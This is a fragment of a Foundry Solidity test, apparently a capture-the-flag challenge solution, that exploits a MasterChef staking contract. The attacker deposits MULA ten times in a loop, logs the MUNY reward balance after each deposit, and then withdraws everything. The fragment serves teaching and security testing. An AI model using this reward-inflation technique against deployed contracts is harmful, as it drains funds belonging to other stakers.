...
contract Testing is Test {
    ...
    function testChallengeExploit() public {
        ...
        // adminUser has 10_000 MULA staked
        // attacker has 10_000 MULA
        mula.approve(address(masterChef),type(uint).max);
        for (int i = 0; i < 10; i++) {
            masterChef.deposit(0, 1_000e18);
            console.log(muny.balanceOf(address(attacker)));
        }
        masterChef.withdraw(0, 10_000e18); // withdraw all
        console.log(muny.balanceOf(address(attacker)));
